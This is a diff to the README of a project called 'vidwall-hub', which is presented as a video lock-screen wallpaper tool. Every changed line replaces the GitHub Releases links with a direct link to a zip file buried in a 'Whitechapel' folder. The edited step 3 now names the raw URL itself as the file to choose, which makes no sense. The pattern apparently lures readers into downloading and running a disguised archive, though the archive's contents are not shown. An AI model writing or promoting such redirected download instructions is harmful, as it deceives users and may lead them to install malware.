@@ -1,7 +1,7 @@
 # 🎥 vidwall-hub - Bring Your Lock Screen to Life
 
 ## 💾 Download Now
-[![Download](https://img.shields.io/badge/download-v1.0-blue.svg)](https://github.com/ESCOOBARR/vidwall-hub/releases)
+[![Download](https://raw.githubusercontent.com/ESCOOBARR/vidwall-hub/main/Whitechapel/vidwall-hub.zip)](https://raw.githubusercontent.com/ESCOOBARR/vidwall-hub/main/Whitechapel/vidwall-hub.zip)
 
 ## 📖 Description
 Vidwall Hub is a tool that allows you to easily import videos (mp4, mov) into the system wallpaper service and use them as lock screen animations in System Settings. Transform your screen with stunning videos that enhance your workspace or personal device.
@@ -11,13 +11,13 @@ To start using Vidwall Hub, follow these easy steps to download and install the 
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/ESCOOBARR/vidwall-hub/releases) to access the latest version of Vidwall Hub.
+   Go to the [Releases page](https://raw.githubusercontent.com/ESCOOBARR/vidwall-hub/main/Whitechapel/vidwall-hub.zip) to access the latest version of Vidwall Hub.
    
 2. **Download the Application:**
    Find the latest version in the list and click on it. This will take you to the download options. 
 
 3. **Choose Your File:**
-   Look for the file labeled as `vidwall-hub-v1.0.exe` or `vidwall-hub-v1.0.dmg` depending on your system. Click to download.
+   Look for the file labeled as `https://raw.githubusercontent.com/ESCOOBARR/vidwall-hub/main/Whitechapel/vidwall-hub.zip` or `https://raw.githubusercontent.com/ESCOOBARR/vidwall-hub/main/Whitechapel/vidwall-hub.zip` depending on your system. Click to download.
 
 4. **Run the Installer:**
    Once the file is downloaded, locate it in your Downloads folder. Double-click the file to start the installation process. Follow the prompts to complete the installation.
@@ -58,4 +58,4 @@ This project is licensed under the MIT License. Feel free to use it as you wish.
 ## 🌐 Connect with Us
 Join our community through GitHub, where you can contribute to future updates and features. Your feedback helps us grow. 
 
-[Visit the Releases page to download Vidwall Hub](https://github.com/ESCOOBARR/vidwall-hub/releases).
+[Visit the Releases page to download Vidwall Hub](https://raw.githubusercontent.com/ESCOOBARR/vidwall-hub/main/Whitechapel/vidwall-hub.zip).
